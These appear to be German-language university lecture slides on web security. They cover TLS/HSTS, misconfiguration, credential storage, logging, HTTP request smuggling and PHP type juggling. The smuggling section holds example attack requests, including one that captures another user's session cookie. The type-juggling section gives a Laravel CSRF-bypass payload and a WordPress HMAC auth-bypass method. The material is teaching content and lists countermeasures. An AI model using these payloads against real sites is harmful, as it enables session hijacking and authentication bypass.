---
author: Andreas Happe
title: Web Security
--- 

# Other Stuff..

# HTTPS/TLS

## HTTPS/TLS: Guidelines

* TLSv1.2 (oder TLSv1.3) mit AES-GCM
  * Ältere Verfahren verwenden unsichere Krypto
  * aktuelle Browser bieten nur TLSv1.2 an
* Vorzugsweise HTTP/2

## HTTPS-Details

* HSTS verwenden
* Perfect Forward Secrecy anbieten
* Alle Kommunikationswege müssen ident abgesichert sein
  * Problem: interne vs. externe Kommunikation

## HSTS

* HTTP Strict Transport Security
* all future requests must use HTTPS
* automatic upgrade from HTTP to HTTPS
* user is prevented from accessing the site over HTTP

```
Strict-Transport-Security: max-age=31536000, includeSubdomain, preload
```

## HTTP/TLS: Howto test

* [testssl.sh](https://testssl.sh/)
* [Qualys SSL Test](https://www.ssllabs.com/ssltest/)
* [bettercrypto.org](https://bettercrypto.org/)

# Misconfiguration / Minimalprinzip

## Beispiel von Software, die man nicht am Server haben will:

* Entwicklungstools wie phpmyadmin
* Debug Mode bei verwendeten Frameworks
* Debug Toolbars bei Verwendung von Frameworks
* Stacktraces mit Detailinformationen
* phpinfo.php
* Beispielscode (/example Directory)

## Beispiel von Meta-Daten, die man nicht haben will:

* .git, .svn Verzeichnisse
* Backup files (.bak, .tmp)
* Private Schlüssel, etc. im Dateisystem
* Credentials im Dateisystem oder in Repositories
* Backups

## Configuration Management

- nicht hard-coded
- Beispiel: .env Files

## Special Case: Credential Management

- potentiell im Framework integriert
- Dezidierte Credential-Services

## Frameworks: Credential Storage

Frameworks bieten zumeist Möglichkeiten zum Speichern sensitiver Keys/Credentials/etc.

Ruby on Rails 5.2:

* credentials.yml.enc -- enthält secrets/credentials/etc
* config/master.key -- key, wird nicht eingecheckt
* Zugriff in der Application: Rails.credentials.key
* rails credentials:edit -- modifiziert das credentials

# Using Components with known Vulnerabilities

## Basics

* Komponenten müssen regelmäßig getestet werden
* nur offizielle Source Server verwenden
* Wann werden die Schwachstellen überprüft?

## Wie kann dies automatisiert überprüft werden

* OWASP dependency-check, retire.js
* OWASP dependency-track

# Logging / Monitoring

## Basics

* Kontroverse bei OWASP Top 10 2017
* Es sollte möglich sein automatisierte Angriffe zu erkennen
* Spätere Auswertung sollte möglich sein
* Betrifft im Webserver Umfeld vor allem Webserver- und Applikationslogs
* Problem: Dev vs Admins

##  Anforderungen

* Zentralisiert (weil mehrere app server, db server, etc.)
* Secure
* Auswertbar

# HTTP Request Smuggling

## About

* Angriff auf die "Infrastruktur"
* Kudos zu [PortSwigger](https://portswigger.net/web-security/request-smuggling)
* Community Mention 2019

## Normaler Ablauf

![Picture](0x08_revproxy.svg){.stretch}

## Angriff

![Picture](0x08_revproxy-desynced.svg){.stretch}

## HTTP Request Länge

Content-Length Header:

``` http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

## Angriff (~2005):

``` http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Content-Length: 5

12345G
```

Might result in:
``` http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Content-Length: 5

12345GPOST / HTTP/1.1
Host: example.com
```

## This was fixed..

## HTTP Request Länge

"chunked" (0xb == 11):

``` http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

## Angriff (~2019):

CL -> TE

``` http
 POST / HTTP/1.1
 Host: vulnerable-website.com
 Content-Length: 13
 Transfer-Encoding: chunked

 0

 SMUGGLED 
 ```

## Angriff (~2019):

TE -> CL

``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

## Angriff (~2019) 

TE -> TE

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## But what to do with that

## But what to do with that

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

## Results in

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

## Gegenmassnahmen

* Jeden Backend-Request über eine eigene Connection schicken
* Backend und Frontend müssen den gleichen Längen-Identifier verwenden
* HTTP/2 verwenden

# PHP Type Juggling

## Vergleichsoperator ===

![Picture](0x09_type_juggling_1.png){.stretch}

## Vergleichsoperator ==

![Picture](0x09_type_juggling_2.png){.stretch}

## Hint

* es gibt auch != und !==

## Fun Examples

``` php
TRUE: "0000" == int(0)
TRUE: "0e12" == int(0)
TRUE: "1abc" == int(1)
TRUE: "0abc" == int(0)
TRUE: "abc"  == int(0) // !!
TRUE: "0e12345" == "0e54321"
TRUE: "0e12345" <= "1"
TRUE: "0e12345" == "0"
TRUE: "0xF"     == "15"
```

## Exploit 1 (Larabel CSRF-Bypass)

``` php
if (Session::token() != Input::get('_token')) {
   throw new Illuminate\Session\TokenMismatchException;
}
// authenticated operation
```

Token: Random-String, in 85% der Fälle mit 0 oder Buchstaben als erstes Zeichen

## Exploit 1 (Larabel CSRF-Bypass)

Exploit:
```
$.ajax("http://<laravel app>/sensitiveaction", {
	type: 'post',
	contentType: 'application/x-www-form-urlencoded; charset=UTF-8; /json',
	data: '{"sensitiveparam": "sensitive", "_token": 0}',});
```

## Exploit 2 (Wordpress Auth Bypass)

``` php
# Cookie vom Browser:
# beinhaltet: $hmac, $user, $expiration

# serverseitiger Check
if ($hmac == hash_hmac('md5', $user .'|'. $expiration, $key)) {
  // authenticated operation
}
```

## Attack

``` php
cookie: set $hmac=0, $user=admin
brute-force over expiration
hash_mac('md5', "admin"."|"."some-date", $key) -> "some-hash.."
```

``` php
if ($hmac == hash_hmac('md5', $user .'|'. $expiration, $key)) {
  // authenticated operation
}
```

``` php
# What if hash looks like "0eabcdefg" and $hmac is set to "0"
if ("0" == "0eabcdefg") { // transforms to "0" == "0"
   // authenticated operation
}
```


# FIN
